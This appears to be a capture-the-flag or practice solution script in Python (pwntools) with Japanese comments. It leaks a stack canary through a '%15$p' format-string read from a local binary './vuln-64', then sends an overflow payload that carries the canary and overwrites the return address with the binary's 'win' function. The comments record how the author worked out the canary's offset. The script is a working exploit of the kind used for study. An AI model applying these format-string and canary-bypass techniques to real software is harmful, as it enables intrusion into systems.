# オリジナルの解答

from pwn import *

file_name = './vuln-64'
elf = ELF(file_name)
p = process(file_name)

p.clean()
p.sendline(b'%15$p') # b'' じゃないと怒られる
canary = int(p.recvline(), 16)

payload = b'A' * 72
payload += p64(canary)
payload += b'A' * 8
payload += p64(elf.symbols['win'])

p.clean()
p.sendline(payload)
print(p.clean().decode('latin-1'))


# %6$pに入力が現れる
# リトルエンディアンなので ABCDEFGH と入れたら DCBA HGFE と見えるはず
# なぜか ABCD1234 だったら 1234 ABCD に格納される場合がある
# 違いがわからない
# よって XXXX YXXX において、Yが00ならそれがカナリア?
# おそらく XXXY XXXX において Yが00ならカナリア
# 最後が00で最初がff、f7とかじゃない、かつランダムに見えるもの
# 5がbuffer始まりまでのオフセットで、そこから+10したらカナリアの位置になる(オフセットではなく)
# よって%15$pでカナリアをリークできる
